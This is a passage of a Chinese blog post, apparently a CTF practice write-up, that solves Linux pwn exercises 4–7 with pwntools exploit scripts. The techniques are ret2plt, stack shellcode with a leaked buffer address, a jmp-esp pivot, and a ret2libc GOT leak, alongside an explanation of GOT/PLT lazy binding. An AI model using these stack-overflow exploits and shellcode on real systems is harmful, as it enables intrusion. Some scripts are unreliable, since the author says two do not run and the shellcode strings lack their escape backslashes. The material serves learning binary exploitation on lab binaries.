+</ol>
+<p>EXP：</p>
+<pre><code class="python">from pwn import *
+
+sh = process(&quot;./pwn4&quot;)
+shelf = ELF(&quot;./pwn4&quot;)
+
+gets_plt = shelf.plt[&#39;gets&#39;]
+system_plt = shelf.plt[&#39;system&#39;]
+
+
+pop_ebp = 0x0804872f
+buf2 = 0x0804A080
+
+payload = flat(
+    [&#39;A&#39;*112, gets_plt, pop_ebp, buf2, system_plt, 0xabababab, buf2]
+)
+
+sh.sendline(payload)
+sh.sendline(&#39;/bin/sh&#39;)
+sh.interactive()
+
+</code></pre>
+<p>成功获得<code>shell</code></p>
+<p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p>
+<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p>
+<p><code>checksec</code>检查保护情况:</p>
+<p><img src="http://file.smilehacker.net/1571559117913.png" alt="checksec"></p>
+<p>发现关闭了<code>NX</code>保护,也就是说可以在堆栈上执行代码了,但是开启了<code>PIE</code>保护,也就是地址随机化,而且程序也变成了64位程序。</p>
+<blockquote>
+<p>PS: 之前看逆向工程权威指南隐约记得传参不一样,这里刚好又出现了。</p>
+<p><code>MSVC</code>和<code>GCC</code>在传参时的不同: </p>
+<ul>
+<li><code>GCC</code>编译的程序在入参时使用<code>mov</code>指令来传参,不像<code>MSVC</code>传参使用push和pop</li>
+</ul>
+<p><code>GCC</code>编译64位程序和32位程序入参时的不同(对比上面的题目和本题目汇编代码即可看出):</p>
+<ul>
+<li><code>GCC</code>编译的32位程序在入参时是直接对堆栈进行操作的</li>
+<li><code>GCC</code>编译的64位程序在入参时使用<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>传递前六个参数</li>
+</ul>
+<p><code>MSVC</code>编译64位程序和32位程序入参时的不同(没有例子):</p>
+<ul>
+<li><code>MSVC</code>编译的32位程序直接使用push指令入栈</li>
+<li><code>MSVC</code>编译的64位程序使用<code>RCX</code>,<code>RDX</code>,<code>R8</code>,<code>R9</code>传递前4个参数</li>
+</ul>
+</blockquote>
+<p><code>IDA</code>分析程序:</p>
+<p><img src="http://file.smilehacker.net/1571559310062.png" alt="IDA分析pwn5"></p>
+<h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><p>一眼就看到了<code>read</code>函数,但是他只读了<code>0x40</code>个字节(64)字节</p>
+<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>现在很熟练了,偏移<code>0x10h</code>个字节,也就是16个字节.然后16+8=24，也就是我们在输入到24个字节是就可以覆盖返回地址</p>
+<h3 id="查看可用函数"><a href="#查看可用函数" class="headerlink" title="查看可用函数"></a>查看可用函数</h3><p>看一下导入函数,发现啥也没</p>
+<p><img src="http://file.smilehacker.net/1571559651228.png" alt="查看导入函数"></p>
+<p>但是堆栈可以执行,我们需要直接放<code>shellcode</code>放在栈中,在这之前我们要计算一下堆栈中可以存放多少字节的<code>shellcode</code>。</p>
+<blockquote>
+<p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p>
+</blockquote>
+<p><code>expoloit-db</code>上找一段下来:</p>
+<pre><code class="assembly"># 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
+</code></pre>
+<p>好了,啥都有了,继续思考，怎么确定<code>payload</code>的地址?</p>
+<p>那就是<code>buf</code>+32个字节,那新的问题又出来了,<code>buf</code>的地址没法确认(因为程序启用了随机化地址保护)</p>
+<p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p>
+<p>妙啊~</p>
+<p>然后整理一下，看缓冲区怎么布置</p>
+<p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+
+sh = process(&#39;./pwn5&#39;)
+# 23 bytes
+# https://www.exploit-db.com/exploits/36858/
+shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x31xd2x0fx05&quot;
+sh.recvuntil(&#39;[&#39;)
+buf_addr = sh.recvuntil(&#39;]&#39;, drop=True)
+buf_addr = int(buf_addr, 16)
+payload = &#39;b&#39; * 24 + p64(buf_addr + 32) + shellcode_x64
+sh.sendline(payload)
+sh.interactive()
+~                      
+</code></pre>
+<p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p>
+<h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p>
+<p><code>checksec</code>检查程序:</p>
+<p><img src="http://file.smilehacker.net/1571561335922.png" alt="checksec检查pwn6"></p>
+<p>啥也没开,别激动,不好搞。</p>
+<p>IDA查看代码:</p>
+<p><img src="http://file.smilehacker.net/1571561531179.png" alt="IDA分析pwn6"></p>
+<h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>一眼就看到<code>gets</code>函数了,但是空间只有<code>0x32</code>即50字节</p>
+<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>现在计算很快了,0x20 + 4 = 0x24 = 32个字节,即淹没32字节即可淹没返回地址</p>
+<h3 id="导入函数表"><a href="#导入函数表" class="headerlink" title="导入函数表"></a>导入函数表</h3><p>不截图了, 没有<code>system</code>函数</p>
+<h3 id="思考（想不通就配合下面的图片）"><a href="#思考（想不通就配合下面的图片）" class="headerlink" title="思考（想不通就配合下面的图片）"></a>思考（想不通就配合下面的图片）</h3><p>现在没招了,用<code>shellcode</code>? 看看现在的空间50-36-4=10，谁有10字节的<code>shellcode</code>赶紧拿出来。</p>
+<p>溢出时没得想了，但是我们可以考虑把<code>shellcode</code>作为正常的参数传入栈中,而且栈也是有可执行权限的(没有启用<code>NX</code>)，这样,我们就有36个字节用来存放<code>shellcode</code>了。找到了新思路，我们需要思考两个问题</p>
+<ol>
+<li>如何找到<code>shellcode</code>起始地址</li>
+<li>如何跳转到<code>sellcode</code>的起始地址</li>
+</ol>
+<p>先解决第一个问题</p>
+<p> 漏洞函数产生的位置是在<code>vul</code>函数中,当<code>vul</code>函数执行完成后返回<code>main</code>函数栈帧,我们可以倒推回<code>s</code>的起始位置，即</p>
+<blockquote>
+<p>esp - 0x20(s的长度) -0x4(vul的返回地址) - 0x4(vul函数的ebp)=0x28</p>
+</blockquote>
+<p>所以,我们已经推算处<code>shellcode</code>的位置。</p>
+<p>解决第二个问题</p>
+<p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p>
+<pre><code class="shell">ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;
+</code></pre>
+<p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p>
+<p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p>
+<pre><code class="assembly">sub esp 0x28; 
+jmp esp;
+</code></pre>
+<p><code>shellcode</code>得到执行。</p>
+<p>看一下当前栈帧的布局:</p>
+<p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p>
+<p>仔细想想,不太好懂。</p>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
+
+sh = process(&#39;./pwn6&#39;)
+
+shellcode_x86 = &quot;x31xc9xf7xe1x51x68x2fx2fx73&quot;
+shellcode_x86 += &quot;x68x68x2fx62x69x6ex89xe3xb0&quot;
+shellcode_x86 += &quot;x0bxcdx80&quot;
+
+sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
+jmp_esp = 0x08048504
+payload = shellcode_x86 + (
+    0x20 - len(shellcode_x86)) * &#39;b&#39; + &#39;bbbb&#39; + p32(jmp_esp) + sub_esp_jmp
+sh.sendline(payload)
+sh.interactive()
+</code></pre>
+<p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p>
+<h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
+<p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p>
+<p><img src="http://file.smilehacker.net/1572240054879.png" alt="checksec检查pwn7"></p>
+<p>只开启了<code>DEP</code>保护。<code>IDA</code>查看掠过，漏洞函数还是一样的，但是没有导入函数,没有合适的<code>Gadget</code>语句。怎么办？</p>
+<p>劫持<code>GOT</code></p>
+<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><blockquote>
+<p>修改某个被调用函数的地址，让其指向另一个函数。</p>
+<p>example : 修改<code>printf()</code>函数的地址使其指向<code>system()</code>函数</p>
+</blockquote>
+<p>要实现上述过程，我们就需要理解一下函数调用时，程序是怎么找到被<code>调用函数</code>的？</p>
+<p>程序在对外部的函数调用时需要在生成可执行文件时包含“外部函数的链接”到程序中,链接的方式分为两种：</p>
+<ul>
+<li>静态链接: 静态链接生成的可执行文件包含外部函数的全部代码</li>
+<li>动态链接: 动态链接生成的可执行文件不包含外部函数的代码，而是运行时将，动态链接库（若干外部函数的集合）加载到内存的某个位置，在发生函数调用时去链接库定位所需的函数。 </li>
+</ul>
+<p>那就出现了一个新的问题。程序如何在链接库内定位到所需函数？这个过程用到两张表<code>GOT</code>和<code>PLT</code></p>
+<ul>
+<li><code>GOT</code>：全局偏移量表(<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able)， 用来存储外部函数在内存的确切地址。<ul>
+<li><code>GOT</code>存储在数据段中(<code>Data Segment</code>)，<strong>可以在程序运行时被修改</strong></li>
+</ul>
+</li>
+<li><code>GIT</code>：程序链接表(<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able)，用来存储外部函数的入口点。程序运行时到<code>PLT</code>表中寻找外部函数的地址。<ul>
+<li><code>PLT</code>存储在代码段(Code Segment)内，在运行之前就已经确定并且不会被修改，所以<code>PLT</code> 并不会知道程序运行时动态链接库被加载的确切位置。 </li>
+</ul>
+</li>
+</ul>
+<p>那么<code>PLT</code>表内存储的入口点是什么?</p>
+<ul>
+<li><p>存储的是<code>GOT</code>表中对应条数的地址</p>
+<p><img src="http://file.smilehacker.net/1572242662913.png" alt="PLT存储"></p>
+</li>
+</ul>
+<p>既然外部函数地址都存放在<code>GOT</code>中,而不是<code>PLT</code>，<code>PLT</code>存储的入口点又指向<code>GOT</code>的对应条目，那程序为什么选在<code>PLT</code>作为函数的入口点，而不是<code>GOT</code>? 在程序启动时确定所有外部函数的内存地址并写入<code>GOT</code>表，之后只使用<code>GOT</code>表不是更方便吗？ </p>
+<ul>
+<li>这样设计的目的是因为效率。</li>
+</ul>
+<p><code>GOT</code>表的<strong>初始值</strong>都指向<code>PLT</code>表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。</p>
+<p>当程序需要调用某个外部函数时，过程如下</p>
+<ul>
+<li>首先到<code>PLT</code>表内寻找对应的入口点，跳转到<code>GOT</code>表中。</li>
+<li>第一次调用这个函数：<ul>
+<li>程序会通过<code>GOT</code>表再次跳转回<code>PLT</code>表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉<code>GOT</code>表的初始值，之后再执行函数调用,</li>
+</ul>
+</li>
+<li>不是第一次调用(再次调用)：<ul>
+<li>程序仍然首先通过<code>PLT</code>表跳转到<code>GOT</code>表，此时<code>GOT</code>表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</li>
+</ul>
+</li>
+</ul>
+<p>第一次调用的示意图:</p>
+<p> <img src="http://file.smilehacker.net/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p>
+<p>不是第一次调用的示意图:</p>
+<p> <img src="http://file.smilehacker.net/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p>
+<p>上面的这个过程采用了<code>LAZY</code>设计思想, 它将需要完成的操作(解析外部函数的内存地址)留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。跟<code>python</code>中的生成器有点像，懒加载</p>
+<p>这个过程也启示了我们如何实现函数的伪装，那就是到<code>GOT</code>表中将函数<code>A</code>的地址修改为函数<code>B</code>的地址。这样在后面所有对函数<code>A</code>的调用都会执行函数<code>B</code>。我们可以将目标分解成以下几个步骤:</p>
+<ul>
+<li>确定函数<code>A</code>在<code>GOT</code>表中的条目位置 </li>
+<li>确定函数<code>B</code>在内存中的地址 </li>
+<li>将函数<code>B</code>的地址写入函数<code>A</code>在<code>GOT</code>表中的条目</li>
+</ul>
+<p>第一个问题，如何确认函数<code>A</code>在<code>GOT</code>表中的位置?</p>
+<p>这个问题好说，程序调用函数时是通过<code>PLT</code>表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到<code>PLT</code>表中该函数的入口点位置，从而定位到该函数在<code>GOT</code>中的条目。 </p>
+<pre><code class="assembly">call 0x08048430 &lt;printf@plt&gt;
+</code></pre>
+<p>就说明<code>printf</code>在<code>PLT</code>表中的入口点是在 <em>0x08048430*，所以 *0x08048430</em> 处存储的就是<code>GOT</code>表中<code>printf</code>的条目地址。 </p>
+<p>第二个问题， 如何确定函数 B 在内存中的地址？ </p>
+<p>如果开启了<code>ASLR</code>，程序每次动态加载的位置都是随机的，就很难直接定位函数位置。假如函数<code>B</code>已经调用过了，我们通过上一个问题的答案来拿到结果，但是，我们想要的函数系统一般又不会调用，<code>GOT</code>表中并没有相应的记录。那怎么办? 幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数<code>A</code>的运行时地址（读取<code>GOT</code>表内容），也知道函数<code>A</code>和函数<code>B</code>在动态链接库内的相对位置，就可以推算出函数<code>B</code>的运行时地址。 </p>
+<p>最后，如何实现 GOT 表中数据的修改？ </p>
+<p><code>ROP</code>,不多说了</p>
+<p>从上面也可以看出，修改<code>GOT</code>表也可以在一定程度上绕过<code>ASLR</code></p>
+<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>看了上面的分析，应该是有个大概的思路了。这里的思路并不是修改某个函数的<code>got</code>记录，而是根据偏移计算出<code>system</code>的地址</p>
+<p>先来想第一个问题，如何拿到<code>system</code>函数的地址?我们需要记住两点`</p>
+<ul>
+<li><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有<code>ASLR</code>保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而<code>libc</code>在<code>github</code>上有人进行收集。<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc</a></li>
+</ul>
+<p>所以如果我们知道<code>libc</code>中某个函数的地址，那么我们就可以确定该程序利用的<code>libc</code>。进而我们就可以知道 <code>system</code>函数的地址。 </p>
+<p>那么如何得到<code>libc</code>中的某个函数的地址呢？我们一般常用的方法是采用<code>got</code>表泄露，即输出某个函数对应的<code>got</code>表项的内容。<strong>当然，由于<code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong> 根据上述方法找到<code>libc</code>之后查询偏移，获取<code>system</code>地址,手动操作有点复杂，而且<code>github</code>有个现成的<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">利用工具</a></p>
+<p>此外，在得到<code>libc</code>之后，其实<code>libc</code>中也是有 /bin/sh 字符串的，所以我们可以一起获得<code>/bin/sh</code>字符串的地址。 </p>
+<p>这里我们泄露<code>puts</code>的地址。基本利用思路如下:</p>
+<ul>
+<li>泄露<code>puts</code>地址</li>
+<li>获取<code>libc</code>版本</li>
+<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
+<li>再次执行源程序(<code>puts</code>函数的回调，直接指向漏洞点)</li>
+<li>触发栈溢出执行<code>system(‘/bin/sh’)</code></li>
+</ul>
+<p>整理的<code>EXP</code>如下:</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+from LibcSearcher import LibcSearcher
+sh = process(&#39;./pwn7&#39;)
+
+ret2libc3 = ELF(&#39;./pwn7&#39;)
+
+puts_plt = ret2libc3.plt[&#39;puts&#39;]
+puts_got = ret2libc3.got[&#39;puts&#39;]
+main = ret2libc3.symbols[&#39;main&#39;]
+
+print &quot;leak puts_got addr and return to main again&quot;
+payload = flat([&#39;A&#39; * 112, puts_plt, main, puts_got])
+sh.sendlineafter(&#39;Can you find it !?&#39;, payload)
+
+print &quot;get the related addr&quot;
+puts_addr = u32(sh.recv()[0:4])
+libc = LibcSearcher(&#39;puts&#39;, puts_addr)
+libcbase = puts_addr - libc.dump(&#39;puts&#39;)
+system_addr = libcbase + libc.dump(&#39;system&#39;)
+binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)
+
+print &quot;get shell&quot;
+payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+</code></pre>
+<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li>
+<li><a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></li>
+<li><a href="https://sp4n9x.github.io/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇-蒸米</a> </li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/ROP/" rel="tag"># ROP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/23/%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="next" title="使用GDB调试MIPS架构的缓冲区溢出">
+                <i class="fa fa-chevron-left"></i> 使用GDB调试MIPS架构的缓冲区溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dad56b440a98d03" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4"
+                alt="TT" />
+            
+              <p class="site-author-name" itemprop="name">TT</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/smile0304" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/SmileKuxiao" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://stackoverflow.com/users/9417433/tt-smile" target="_blank" title="StackOverflow">
+                      
+                        <i class="fa fa-fw fa-stack-overflow"></i>StackOverflow</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+<script type="text/javascript" id="clstr_globe" src="//cdn.clustrmaps.com/globe.js?d=8vf2nFJ6Gn-Da3MWWOlXunOcDzXOvwCA_WMLS81WswM"></script>
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-Pwn"><span class="nav-number">1.</span> <span class="nav-text">Linux Pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一"><span class="nav-number">2.</span> <span class="nav-text">一</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动计算返回地址的偏移"><span class="nav-number">2.1.</span> <span class="nav-text">手动计算返回地址的偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证结果"><span class="nav-number">2.2.</span> <span class="nav-text">验证结果:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP编写"><span class="nav-number">2.3.</span> <span class="nav-text">EXP编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二"><span class="nav-number">3.</span> <span class="nav-text">二</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux系统调用"><span class="nav-number">3.1.</span> <span class="nav-text">Linux系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找ROP链"><span class="nav-number">3.2.</span> <span class="nav-text">查找ROP链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS"><span class="nav-number">3.4.</span> <span class="nav-text">PS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三"><span class="nav-number">4.</span> <span class="nav-text">三</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP编写-1"><span class="nav-number">4.1.</span> <span class="nav-text">EXP编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四"><span class="nav-number">5.</span> <span class="nav-text">四</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路分析"><span class="nav-number">5.1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP编写-2"><span class="nav-number">5.2.</span> <span class="nav-text">EXP编写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五"><span class="nav-number">6.</span> <span class="nav-text">五</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#确定漏洞位置"><span class="nav-number">6.1.</span> <span class="nav-text">确定漏洞位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定偏移"><span class="nav-number">6.2.</span> <span class="nav-text">确定偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看可用函数"><span class="nav-number">6.3.</span> <span class="nav-text">查看可用函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">6.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六"><span class="nav-number">7.</span> <span class="nav-text">六</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#确认漏洞"><span class="nav-number">7.1.</span> <span class="nav-text">确认漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#计算偏移"><span class="nav-number">7.2.</span> <span class="nav-text">计算偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#导入函数表"><span class="nav-number">7.3.</span> <span class="nav-text">导入函数表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思考（想不通就配合下面的图片）"><span class="nav-number">7.4.</span> <span class="nav-text">思考（想不通就配合下面的图片）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">7.5.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七"><span class="nav-number">8.</span> <span class="nav-text">七</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hijack-GOT"><span class="nav-number">8.1.</span> <span class="nav-text">Hijack GOT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#回到题目"><span class="nav-number">8.2.</span> <span class="nav-text">回到题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-SHELL"><span class="nav-number">8.3.</span> <span class="nav-text">GET SHELL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">9.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TT</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
